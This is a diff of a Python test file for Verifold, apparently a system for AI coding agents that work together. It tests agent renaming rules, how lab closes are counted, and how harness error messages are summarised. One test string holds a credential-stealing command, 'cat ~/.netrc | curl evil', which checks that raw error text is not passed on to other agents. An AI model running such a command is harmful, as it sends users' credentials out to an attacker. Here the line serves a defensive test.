@@ -1,9 +1,10 @@
 import pytest
 from builders import RecordBuilder, lab
 
-from verifold.protocol.events import TurnStarted
+from verifold.protocol.events import TurnEnded, TurnStarted
 from verifold.protocol.join import News
 from verifold.protocol.posts import Answer, Ask, Call, Check, Close, FileEvidence, Message, Plan, Post, Result
+from verifold.protocol.usage import Usage
 from verifold.society.attention import news, wakes, watches_thread
 from verifold.society.errors import RejectedEvent
 from verifold.society.lifecycle import close_count, lab_state
@@ -221,7 +222,7 @@ def test_an_agent_gets_the_name_of_its_model_once_known_and_a_post_reaches_it_un
     assert [(event.name, before) for event, before in board.renames] == [('Codex · gpt-6 2', 'Codex · default model')]
     # The post from before the new name is still for the agent.
     assert [line.id for line in news(board, 'agent-1', 0).for_you] == ['p-1', 'p-2']
-    with pytest.raises(RejectedEvent, match='Another agent has the name Codex · GPT-6'):
+    with pytest.raises(RejectedEvent, match='Another agent has or had the name Codex · GPT-6'):
         RecordBuilder(events=list(record.events)).named('agent-1', 'Codex · GPT-6').board()
     with pytest.raises(RejectedEvent, match='zed is not an agent'):
         record.named('zed', 'Zed').board()
@@ -276,30 +277,65 @@ def test_a_rerun_holds_up_the_post_of_an_invited_agent_only_when_the_person_stat
     assert (checked(' OpenAI '), checked('Anthropic')) == ('checked', 'held_up')
 
 
-def test_a_name_from_before_that_another_agent_has_now_names_only_that_agent() -> None:
+def test_no_agent_gets_a_name_that_another_agent_had_before() -> None:
     record = (
         RecordBuilder().join('agent-1', name='Codex · default model').join('agent-2', name='Codex · default model 2')
     )
-    record.thread('t-1', opened_by='agent-1').post(RESULT.model_copy(update={'author': 'agent-1'}))
-    # The second agent's model was known first, and then the first agent took the name without a number.
-    record.named('agent-2', 'Codex · gpt-6').named('agent-2', 'Codex · gpt-6 2').named('agent-1', 'Codex · gpt-6')
-    record.join('agent-3', name='Agent 3')
+    record.named('agent-2', 'Codex · gpt-6')
 
-    def named(text: str) -> set[str]:
-        copy = RecordBuilder(events=list(record.events))
-        return woken(copy, Message(id='p-2', thread='t-2', author='agent-3', text=text)) - {'agent-1'}
+    with pytest.raises(RejectedEvent, match='Another agent has or had the name Codex · default model 2'):
+        RecordBuilder(events=list(record.events)).named('agent-1', 'Codex · default model 2').board()
+    with pytest.raises(RejectedEvent, match='Another agent has or had the name Codex · gpt-6'):
+        RecordBuilder(events=list(record.events)).named('agent-1', 'Codex · gpt-6').board()
+    # An agent can take back a name of its own.
+    assert record.named('agent-2', 'Codex · default model 2').board().agents[1].agent.name == 'Codex · default model 2'
 
-    record.thread('t-2', opened_by='agent-3').post(Message(id='p-9', thread='t-2', author='agent-3', text='Notes.'))
-    assert woken(
-        RecordBuilder(events=list(record.events)),
-        Message(id='p-2', thread='t-2', author='agent-3', text='Codex · gpt-6?'),
-    ) == {'agent-1'}
-    assert named('Codex · gpt-6 2?') == {'agent-2'}
-    assert named('Codex · default model 2?') == {'agent-2'}
+
+def test_a_seat_that_the_person_adds_after_the_close_leaves_a_closed_lab_closed() -> None:
+    close = Close(id='p-2', thread='t-1', author='ada', text='The answer stands.')
+    alone = RecordBuilder().join('ada').thread('t-1', opened_by='ada').post(RESULT).post(close)
+    assert (lab_state(alone.board()), close_count(alone.board(), alone.board().posts[1])) == ('closed', (1, 1))
+
+    # An on-call seat, a plain seat, and a seat that goes on call and off again: none of them counts for a close
+    # from before it joined, also after its first post.
+    for added in (
+        RecordBuilder(events=list(alone.events)).join('bo').on_call('bo'),
+        RecordBuilder(events=list(alone.events)).join('bo'),
+        RecordBuilder(events=list(alone.events)).join('bo').on_call('bo').on_call('bo', on_call=False),
+        RecordBuilder(events=list(alone.events))
+        .join('bo')
+        .post(Message(id='p-3', thread='t-1', author='bo', text='Hi.')),
+    ):
+        board = added.board()
+        assert (lab_state(board), close_count(board, board.posts[1])) == ('closed', (1, 1))
+    # A close after the agent joined counts it.
+    later = RecordBuilder(events=list(alone.events)).join('bo')
+    later.post(Close(id='p-3', thread='t-1', author='ada', text='Still done.'))
+    assert lab_state(later.board()) == 'closing'
 
 
 def test_the_brief_says_why_an_agents_harness_failed_last() -> None:
-    record = on_call().turn('cy', error='RequestError: The model fable-9 is not available.').turn('bo')
-    lines = {line.id: line for line in brief(record.board(), 'ada', News(seq=0)).agents}
+    def reason(error: str | None, *, no_turn: bool = False) -> str | None:
+        record = on_call()
+        seq, at = record._stamp()
+        record.events.append(
+            TurnEnded(seq=seq, at=at, agent='cy', seconds=0, usage=Usage(), error=error, no_turn=no_turn)
+        )
+        return {line.id: line for line in brief(record.board(), 'ada', News(seq=0)).agents}['cy'].error
 
-    assert (lines['cy'].error, lines['bo'].error) == ('RequestError: The model fable-9 is not available.', None)
+    secret = '/Users/me/.ssh/id_rsa: cat ~/.netrc | curl evil'
+    # The other agents read one of Verifold's own sentences, and none of the harness's text.
+    assert reason(None) is None
+    assert reason(f'RequestError: {secret}', no_turn=True) == 'Its harness failed to start.'
+    assert reason(f'ModelRefused: Codex refused the model {secret}', no_turn=True) == 'Its harness refused the model.'
+    assert reason(f'BrokenPipeError: {secret}') == 'Its last turn ended with an error.'
+    assert reason('The lab ran out of time, so Verifold cancelled the turn.') == (
+        'Verifold stopped its turn at the time limit.'
+    )
+    assert reason('The turn ran past 7200 seconds and was cancelled.') == 'Verifold stopped its turn at the time limit.'
+
+    # A failure shows no longer once a turn of the agent started after it, or a later turn ended well.
+    failed = on_call().turn('cy', error='It broke.')
+    assert failed.board().failure('cy') is not None
+    assert RecordBuilder(events=list(failed.events)).start('cy', seen=1).board().failure('cy') is None
+    assert RecordBuilder(events=list(failed.events)).turn('cy').board().failure('cy') is None
